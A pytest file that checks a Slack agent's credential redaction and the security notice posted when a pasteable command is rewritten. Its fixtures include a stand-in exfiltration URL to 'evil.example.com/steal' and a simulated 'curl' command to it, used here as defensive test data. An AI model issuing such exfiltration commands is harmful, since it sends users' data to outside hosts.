"""Warn the reader when credential redaction rewrites pasteable text.

Credential redaction rewrites assistant text on the way out of a channel, so a
command the reader copies has a placeholder where the credential was and will not
run when pasted. The fix sends a follow-up notice; it does NOT relax redaction,
because a channel is an egress path.

Two halves live here: the shared notice builder in ``messaging.renderer`` that
every channel formats through, and the Slack delivery path driven end to end
through ``handle_message`` with the same fake Slack client and fake session
manager the other handler tests use. The iMessage delivery half is in
``test_imessage_renderer.py``, next to that renderer's other tests.
"""

from __future__ import annotations

import pytest
from test_slack_handler import FakeProvider, FakeSessionManager

from conftest import MockSlackClient
from kiro_crew.messaging.renderer import credential_redaction_notice, redaction_notice
from kiro_crew.providers.base import LLMEvent
from kiro_crew.slack.handler import (
    _pending_approvals,
    _thread_agents,
    _trusted_sessions,
    handle_message,
)

_SECRET_URI = "postgresql://user:SuperSecret123@db.example.com:5432/prod"
# Trips ``redact_exfiltration_urls`` (long opaque query payload to an unknown
# host) without carrying any credential-shaped token, so a test over it isolates
# the URL rewriter from the credential pass.
_EXFIL_URL = "https://evil.example.com/steal?data=" + "A" * 250
_NOTICE_MARK = "Security notice"


@pytest.fixture(autouse=True)
def _clean_state():
    _pending_approvals.clear()
    _trusted_sessions.clear()
    _thread_agents.clear()
    yield
    _pending_approvals.clear()
    _trusted_sessions.clear()
    _thread_agents.clear()


@pytest.fixture(autouse=True)
def _ensure_reactions_enabled(monkeypatch):
    import dataclasses

    from kiro_crew.config.loader import KiroCrewConfig

    _real_load = KiroCrewConfig.load

    def _patched_load():
        cfg = _real_load()
        return dataclasses.replace(
            cfg, slack=dataclasses.replace(cfg.slack, reactions_enabled=True)
        )

    monkeypatch.setattr(KiroCrewConfig, "load", _patched_load)


def _force_show_thinking(monkeypatch):
    import dataclasses

    from kiro_crew.config.loader import KiroCrewConfig

    _real_load = KiroCrewConfig.load

    def _patched():
        cfg = _real_load()
        return dataclasses.replace(
            cfg,
            slack=dataclasses.replace(cfg.slack, reactions_enabled=True, show_thinking=True),
        )

    monkeypatch.setattr(KiroCrewConfig, "load", _patched)


def _wire_text(slack: MockSlackClient) -> str:
    """All text that reached the wire, across every text-bearing action."""
    return "".join(
        a[1].get("text") or ""
        for a in slack.actions
        if a[0] in ("append_stream", "stop_stream", "update", "post")
    )


def _notice_posts(slack: MockSlackClient) -> list[dict]:
    return [
        a[1] for a in slack.actions if a[0] == "post" and _NOTICE_MARK in (a[1].get("text") or "")
    ]


class TestSharedNoticeBuilder:
    """The one builder every channel formats its notice through.

    Pinned here rather than per channel: the point of sharing it is that Slack and
    iMessage cannot drift into two spellings, each needing its own audit for
    leaked bytes.
    """

    def test_singular_wording_no_secret(self):
        msg = credential_redaction_notice(1)
        assert "A credential" in msg
        assert "was replaced" in msg
        assert "paste it as-is" in msg
        assert "SuperSecret123" not in msg

    def test_plural_wording(self):
        msg = credential_redaction_notice(3)
        assert "3 credentials" in msg
        assert "were replaced" in msg

    def test_carries_no_channel_markup_or_emoji(self):
        """One string ships to every channel, so it must render as written.

        Slack renders mrkdwn and an emoji shortcode; iMessage renders neither, so
        any markup here would reach an iMessage reader as literal punctuation.
        """
        msg = credential_redaction_notice(2)
        assert ":" in msg  # the "Security notice:" lead-in, not a shortcode
        assert not any(token in msg for token in ("*", "_", "`", "<", ">", ":lock:"))
        assert msg.isascii()


class TestRedactionNoticeIsTheCredentialNotice:
    """``redaction_notice`` is the credential notice: no redactor replaces a URL whole,
    so every placeholder a reader sees is a credential tag."""

    @pytest.mark.parametrize("count", [1, 2, 5])
    def test_credential_only_is_byte_identical_to_the_credential_notice(self, count):
        """Regression guard: the wording every channel already ships is unchanged."""
        assert redaction_notice(count, 0) == credential_redaction_notice(count)
        assert redaction_notice(count) == credential_redaction_notice(count)

    @pytest.mark.parametrize("counts", [(0, 1), (1, 1), (2, 3)])
    def test_a_url_count_is_a_caller_error(self, counts):
        with pytest.raises(ValueError):
            redaction_notice(*counts)

    def test_zero_counts_are_a_caller_error(self):
        with pytest.raises(ValueError):
            redaction_notice(0, 0)


class TestSlackRedactionNotice:
    @pytest.mark.asyncio
    async def test_redacted_answer_posts_a_warning_and_keeps_redaction(self):
        slack = MockSlackClient()
        provider = FakeProvider([LLMEvent(kind="text_chunk", text=f"Run: psql {_SECRET_URI}")])
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "give me the connect string", None, "m1", "U1")

        wire = _wire_text(slack)
        # Redaction not relaxed: the secret never reached the wire, the tag did.
        assert "SuperSecret123" not in wire
        assert "[REDACTED: credential]" in wire
        # Exactly one notice posted, in the thread, telling the user it was altered.
        notices = _notice_posts(slack)
        assert len(notices) == 1
        assert "paste it as-is" in notices[0]["text"]
        assert "SuperSecret123" not in notices[0]["text"]

    @pytest.mark.asyncio
    async def test_clean_answer_posts_no_warning(self):
        slack = MockSlackClient()
        provider = FakeProvider([LLMEvent(kind="text_chunk", text="Deploy finished, all green.")])
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "status?", None, "m1", "U1")

        assert _notice_posts(slack) == []

    @pytest.mark.asyncio
    async def test_exactly_one_warning_when_both_answer_and_thinking_redacted(self, monkeypatch):
        _force_show_thinking(monkeypatch)
        slack = MockSlackClient()
        provider = FakeProvider(
            [
                LLMEvent(kind="thinking_chunk", text=f"I will use {_SECRET_URI} to connect."),
                LLMEvent(kind="text_chunk", text=f"Run: psql {_SECRET_URI}"),
            ]
        )
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "connect", None, "m1", "U1")

        # One turn, one notice, even though both surfaces carried a placeholder.
        assert len(_notice_posts(slack)) == 1
        assert "SuperSecret123" not in _wire_text(slack)

    @pytest.mark.asyncio
    async def test_notice_carries_no_secret_bytes(self):
        slack = MockSlackClient()
        provider = FakeProvider([LLMEvent(kind="text_chunk", text=f"use {_SECRET_URI}")])
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "connect", None, "m1", "U1")

        for notice in _notice_posts(slack):
            assert "SuperSecret123" not in notice["text"]

    @pytest.mark.asyncio
    async def test_a_url_with_no_credential_posts_no_warning(self):
        """A URL is never replaced whole: with no credential in it, it reaches the
        wire as written and nothing was rewritten, so there is nothing to warn about."""
        slack = MockSlackClient()
        provider = FakeProvider([LLMEvent(kind="text_chunk", text=f"run: curl '{_EXFIL_URL}'")])
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "fetch it", None, "m1", "U1")

        assert "evil.example.com/steal" in _wire_text(slack)
        assert _notice_posts(slack) == []

    @pytest.mark.asyncio
    async def test_credential_only_wording_is_unchanged_by_the_url_tally(self):
        """Regression guard: a credential-only turn posts the exact prior sentence."""
        slack = MockSlackClient()
        provider = FakeProvider([LLMEvent(kind="text_chunk", text=f"Run: psql {_SECRET_URI}")])
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "connect", None, "m1", "U1")

        notices = _notice_posts(slack)
        assert len(notices) == 1
        assert notices[0]["text"] == credential_redaction_notice(1)

    @pytest.mark.asyncio
    async def test_credential_and_url_in_one_turn_post_exactly_one_credential_notice(self):
        slack = MockSlackClient()
        provider = FakeProvider(
            [LLMEvent(kind="text_chunk", text=f"psql {_SECRET_URI}; then curl '{_EXFIL_URL}'")]
        )
        sessions = FakeSessionManager(provider)
        await handle_message(slack, sessions, "C1", "do both", None, "m1", "U1")

        notices = _notice_posts(slack)
        assert [n["text"] for n in notices] == [credential_redaction_notice(1)]
        assert "evil.example.com/steal" in _wire_text(slack)


class TestCountRedactionTags:
    """The shared tally every notice surface counts through."""

    def test_counts_every_credential_tag(self):
        from kiro_crew.messaging.renderer import count_redaction_tags
        from kiro_crew.security import CREDENTIAL_REDACTION_TAGS

        text = f"a {CREDENTIAL_REDACTION_TAGS[0]} b {CREDENTIAL_REDACTION_TAGS[1]}"
        assert count_redaction_tags(text) == (2, 0)

    def test_the_old_url_placeholder_is_not_counted(self):
        """No redactor writes it any more, so in a reply it is text the model wrote."""
        from kiro_crew.messaging.renderer import count_redaction_tags

        assert count_redaction_tags("[REDACTED: suspicious URL to a.example]") == (0, 0)

    def test_clean_text_counts_zero_zero(self):
        from kiro_crew.messaging.renderer import count_redaction_tags

        assert count_redaction_tags("All green, deploy finished.") == (0, 0)

    def test_matches_what_the_redactors_actually_emit(self):
        from kiro_crew.messaging.renderer import count_redaction_tags
        from kiro_crew.security import redact_credentials, redact_exfiltration_urls

        out, _ = redact_exfiltration_urls(f"curl '{_EXFIL_URL}'")
        assert out == f"curl '{_EXFIL_URL}'"
        out, _ = redact_credentials(out + f" then psql {_SECRET_URI}")
        cred, url = count_redaction_tags(out)
        assert cred >= 1 and url == 0
